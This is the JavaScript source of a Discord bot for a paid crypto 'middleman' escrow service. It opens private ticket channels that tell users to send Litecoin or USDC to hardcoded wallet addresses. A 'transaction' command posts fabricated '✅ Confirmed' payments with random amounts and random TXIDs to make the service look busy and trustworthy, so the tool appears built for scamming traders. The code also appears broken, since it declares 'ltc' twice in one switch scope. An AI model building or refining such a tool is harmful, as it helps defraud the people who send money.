const { Client, GatewayIntentBits, Partials, Events, PermissionFlagsBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers],
    partials: [Partials.Channel, Partials.Message]
});

const OWNER_ID = '1422945082746601594';
const LTC_ADDRESS = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
const USDC_ADDRESS = '0x62440a91e8F26e07bf20Ba84F71CABF6d71dBc5E';

client.config = { OWNER_ID, TICKET_CATEGORY: null, MANUAL_CATEGORY: null, LOG_CHANNEL: null };
client.activeTickets = new Map();
const isOwner = (id) => id === OWNER_ID;

const commands = [
    { name: 'panel', description: 'Spawn middleman panel', defaultMemberPermissions: PermissionFlagsBits.Administrator },
    { name: 'manual', description: 'Spawn manual panel', defaultMemberPermissions: PermissionFlagsBits.Administrator },
    { name: 'embed', description: 'Spawn custom embed', options: [{ name: 'title', type: 3, description: 'Title', required: true }, { name: 'description', type: 3, description: 'Description', required: true }, { name: 'color', type: 3, description: 'Hex color', required: false }], defaultMemberPermissions: PermissionFlagsBits.Administrator },
    { name: 'tickets', description: 'Set auto category', options: [{ name: 'categoryid', type: 3, description: 'Category ID', required: true }], defaultMemberPermissions: PermissionFlagsBits.Administrator },
    { name: 'manualcategory', description: 'Set manual category', options: [{ name: 'categoryid', type: 3, description: 'Category ID', required: true }], defaultMemberPermissions: PermissionFlagsBits.Administrator },
    { name: 'log', description: 'Set log channel', options: [{ name: 'channel', type: 7, description: 'Channel', required: true }], defaultMemberPermissions: PermissionFlagsBits.Administrator },
    { name: 'transaction', description: 'Trigger fake transaction', options: [{ name: 'channelid', type: 3, description: 'Channel ID', required: true }], defaultMemberPermissions: PermissionFlagsBits.Administrator },
    { name: 'close', description: 'Close ticket' },
    { name: 'say', description: 'Send message', options: [{ name: 'channel', type: 7, description: 'Channel', required: true }, { name: 'message', type: 3, description: 'Message', required: true }], defaultMemberPermissions: PermissionFlagsBits.Administrator }
];

client.on(Events.GuildCreate, async (g) => { try { await g.commands.set(commands); } catch (e) {} });
client.on(Events.ClientReady, async () => { console.log(`✅ ${client.user.tag}`); for (const [, g] of client.guilds.cache) { try { await g.commands.set(commands); } catch (e) {} } });

client.on(Events.InteractionCreate, async (i) => {
    if (!i.isChatInputCommand()) return;
    const { commandName, user, channel } = i;
    const deny = (m) => i.reply({ content: `❌ ${m}`, ephemeral: true });

    try {
        switch (commandName) {
            case 'panel':
                if (!isOwner(user.id)) return deny('Owner only');
                const info = new EmbedBuilder().setTitle("Jace's Auto Middleman").setDescription('• Paid Service\n• Read ToS: #tos-crypto').setColor(0x2B2D31);
                const fees = new EmbedBuilder().setTitle('Fees:').setDescription('• $250+: $1.50\n• Under $250: $0.50\n• Under $50: **FREE**').setColor(0x2B2D31);
                const ltc = new EmbedBuilder().setTitle('Ł • Request Litecoin • Ł').setColor(0x2B2D31);
                const ltcRow = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('request_ltc').setLabel('Request LTC').setStyle(ButtonStyle.Primary).setEmoji('Ł'));
                const usdc = new EmbedBuilder().setTitle('💲 • Request USDC').setDescription('**[ERC-20]** • 💲\n• Network: **ETH (ERC-20)**').setColor(0x2B2D31);
                const usdcRow = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('request_usdc').setLabel('Request USDC [ERC-20]').setStyle(ButtonStyle.Success).setEmoji('💲'));
                await channel.send({ embeds: [info, fees] });
                await channel.send({ embeds: [ltc], components: [ltcRow] });
                await channel.send({ embeds: [usdc], components: [usdcRow] });
                await i.deferReply({ ephemeral: true });
                await i.deleteReply();
                break;

            case 'manual':
                if (!isOwner(user.id)) return deny('Owner only');
                const man = new EmbedBuilder().setTitle('👤 Manual Middleman Service').setDescription('Manual middleman service, Please follow the rules and wait patiently').setColor(0xFFA500)
                    .addFields({ name: 'Tier 1', value: '$200 or under', inline: true }, { name: 'Tier 2', value: '$500 or under', inline: true }, { name: 'Tier 3', value: '$1000+', inline: true });
                const manRow = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('manual_tier1').setLabel('Tier 1 ($200)').setStyle(ButtonStyle.Primary).setEmoji('🥉'), new ButtonBuilder().setCustomId('manual_tier2').setLabel('Tier 2 ($500)').setStyle(ButtonStyle.Secondary).setEmoji('🥈'), new ButtonBuilder().setCustomId('manual_tier3').setLabel('Tier 3 ($1000+)').setStyle(ButtonStyle.Success).setEmoji('🥇'));
                await channel.send({ embeds: [man], components: [manRow] });
                await i.deferReply({ ephemeral: true });
                await i.deleteReply();
                break;

            case 'embed':
                if (!isOwner(user.id)) return deny('Owner only');
                const emb = new EmbedBuilder().setTitle(i.options.getString('title')).setDescription(i.options.getString('description')).setColor(parseInt((i.options.getString('color') || '5865F2').replace('#', ''), 16) || 0x5865F2);
                await channel.send({ embeds: [emb] });
                await i.deferReply({ ephemeral: true });
                await i.deleteReply();
                break;

            case 'tickets':
                if (!isOwner(user.id)) return deny('Owner only');
                client.config.TICKET_CATEGORY = i.options.getString('categoryid');
                await i.reply({ content: '✅ Auto category set', ephemeral: true });
                break;

            case 'manualcategory':
                if (!isOwner(user.id)) return deny('Owner only');
                client.config.MANUAL_CATEGORY = i.options.getString('categoryid');
                await i.reply({ content: '✅ Manual category set', ephemeral: true });
                break;

            case 'log':
                if (!isOwner(user.id)) return deny('Owner only');
                client.config.LOG_CHANNEL = i.options.getChannel('channel').id;
                await i.reply({ content: '✅ Log channel set', ephemeral: true });
                break;

            case 'transaction':
                if (!isOwner(user.id)) return deny('Owner only');
                const ch = await client.channels.fetch(i.options.getString('channelid')).catch(() => null);
                if (!ch) return deny('Invalid channel');
                const usd = Math.floor(Math.random() * 696) + 5;
                const ltc = (usd / 55.57).toFixed(8);
                const isU = Math.random() > 0.5;
                const cur = isU ? 'USDC' : 'LTC';
                const amt = isU ? usd.toFixed(2) : ltc;
                let tx = ''; for (let j = 0; j < 64; j++) tx += '0123456789abcdef'[Math.floor(Math.random() * 16)];
                const txe = new EmbedBuilder().setTitle('🔔 New Transaction').setDescription(`**${amt} ${cur}** ($${usd})`).addFields({ name: 'TXID', value: `\`${tx.slice(0, 10)}...${tx.slice(-10)}\``, inline: false }, { name: 'Status', value: '✅ Confirmed', inline: true }, { name: 'From', value: '`Anonymous`', inline: true }, { name: 'To', value: '`Anonymous`', inline: true }).setColor(0x00FF00).setTimestamp();
                await ch.send({ embeds: [txe] });
                await i.reply({ content: '✅ Fake transaction sent', ephemeral: true });
                break;

            case 'close':
                if (!i.channel.name.includes('ticket')) return deny('Not a ticket');
                await i.reply('🔒 Closing in 5s...');
                setTimeout(() => i.channel.delete().catch(() => {}), 5000);
                break;

            case 'say':
                if (!isOwner(user.id)) return deny('Owner only');
                await i.options.getChannel('channel').send(i.options.getString('message'));
                await i.reply({ content: '✅ Message sent', ephemeral: true });
                break;
        }
    } catch (e) {
        console.error(e);
        if (!i.replied && !i.deferred) await i.reply({ content: '❌ Error', ephemeral: true });
    }
});

client.on(Events.InteractionCreate, async (i) => {
    if (!i.isButton()) return;
    const { customId, user } = i;

    if (customId === 'request_ltc') {
        if (!client.config.TICKET_CATEGORY) return i.reply({ content: '❌ Set category first', ephemeral: true });
        const m = new ModalBuilder().setCustomId('ltc_modal').setTitle('LTC Amount');
        m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('amount').setLabel('USD Amount').setStyle(TextInputStyle.Short).setRequired(true)));
        await i.showModal(m);
    }

    if (customId === 'request_usdc') {
        if (!client.config.TICKET_CATEGORY) return i.reply({ content: '❌ Set category first', ephemeral: true });
        const m = new ModalBuilder().setCustomId('usdc_modal').setTitle('USDC Amount');
        m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('amount').setLabel('USD Amount').setStyle(TextInputStyle.Short).setRequired(true)));
        await i.showModal(m);
    }

    if (customId.startsWith('manual_tier')) {
        const tier = customId.replace('manual_tier', '');
        const limits = { '1': 200, '2': 500, '3': 1000 };
        if (!client.config.MANUAL_CATEGORY) return i.reply({ content: '❌ Set manual category first', ephemeral: true });
        try {
            const c = await i.guild.channels.create({ name: `manual-${user.username}-t${tier}`, parent: client.config.MANUAL_CATEGORY, permissionOverwrites: [{ id: i.guild.id, deny: [PermissionFlagsBits.ViewChannel] }, { id: user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }] });
            const e = new EmbedBuilder().setTitle(`👤 Manual | Tier ${tier}`).setDescription(`<@${user.id}>\n**Limit: $${limits[tier]}**`).addFields({ name: 'LTC Address', value: `\`${LTC_ADDRESS}\``, inline: false }, { name: 'Network', value: 'Litecoin', inline: true }, { name: 'Status', value: '⏳ Waiting...', inline: true }).setColor(0xBFBBBB);
            const r = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('close_ticket').setLabel('Close').setStyle(ButtonStyle.Danger));
            await c.send({ content: `<@${user.id}>`, embeds: [e], components: [r] });
            await i.reply({ content: `✅ ${c}`, ephemeral: true });
            client.activeTickets.set(c.id, { userId: user.id, tier, type: 'manual' });
        } catch (e) { await i.reply({ content: '❌ Failed', ephemeral: true }); }
    }

    if (customId === 'close_ticket') {
        await i.reply('🔒 Closing...');
        await i.channel.delete().catch(() => {});
    }
});

client.on(Events.InteractionCreate, async (i) => {
    if (!i.isModalSubmit()) return;
    const amt = i.fields.getTextInputValue('amount');

    if (i.customId === 'ltc_modal') {
        try {
            await i.deferReply({ ephemeral: true });
            const c = await i.guild.channels.create({ name: `ltc-${i.user.username}-${amt}`, parent: client.config.TICKET_CATEGORY, permissionOverwrites: [{ id: i.guild.id, deny: [PermissionFlagsBits.ViewChannel] }, { id: i.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }] });
            const e = new EmbedBuilder().setTitle('🤖 Auto | LTC').setDescription(`<@${i.user.id}>\n**$${amt}**`).addFields({ name: 'Address', value: `\`${LTC_ADDRESS}\``, inline: false }, { name: 'Network', value: 'Litecoin', inline: true }, { name: 'Status', value: '⏳ Awaiting...', inline: true }).setColor(0xBFBBBB);
            const r = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('close_ticket').setLabel('Close').setStyle(ButtonStyle.Danger));
            await c.send({ content: `<@${i.user.id}>`, embeds: [e], components: [r] });
            await i.editReply({ content: `✅ ${c}` });
            client.activeTickets.set(c.id, { userId: i.user.id, crypto: 'LTC', amount: amt, type: 'auto' });
        } catch (e) { await i.editReply({ content: '❌ Failed' }); }
    }

    if (i.customId === 'usdc_modal') {
        try {
            await i.deferReply({ ephemeral: true });
            const c = await i.guild.channels.create({ name: `usdc-${i.user.username}-${amt}`, parent: client.config.TICKET_CATEGORY, permissionOverwrites: [{ id: i.guild.id, deny: [PermissionFlagsBits.ViewChannel] }, { id: i.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }] });
            const e = new EmbedBuilder().setTitle('🤖 Auto | USDC').setDescription(`<@${i.user.id}>\n**$${amt}**`).addFields({ name: 'Address', value: `\`${USDC_ADDRESS}\``, inline: false }, { name: 'Network', value: 'Ethereum (ERC-20)', inline: true }, { name: 'Status', value: '⏳ Awaiting...', inline: true }).setColor(0x2775CA);
            const r = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('close_ticket').setLabel('Close').setStyle(ButtonStyle.Danger));
            await c.send({ content: `<@${i.user.id}>`, embeds: [e], components: [r] });
            await i.editReply({ content: `✅ ${c}` });
            client.activeTickets.set(c.id, { userId: i.user.id, crypto: 'USDC', amount: amt, type: 'auto' });
        } catch (e) { await i.editReply({ content: '❌ Failed' }); }
    }
});

client.login(process.env.DISCORD_TOKEN);
